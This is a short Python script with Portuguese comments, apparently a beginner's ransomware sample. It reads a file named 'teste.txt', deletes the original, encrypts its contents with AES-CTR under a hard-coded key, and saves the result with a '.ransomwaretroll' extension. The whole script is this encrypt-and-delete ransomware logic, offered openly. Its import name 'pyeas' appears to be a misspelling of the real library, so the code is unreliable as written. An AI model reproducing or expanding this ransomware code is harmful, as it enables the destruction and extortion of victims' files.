import os
import pyeas

# abrir arquivo que vai ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# remover arquivo originals

os.remove(file_name)

# definir a chave de encriptação

key = b'testeransomwares'
aes = pyeas.AESModeOfOperationCTR(key)

# criptografar o arquivo

crypto_data = aes.encrypt(file_data)

# salvar arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()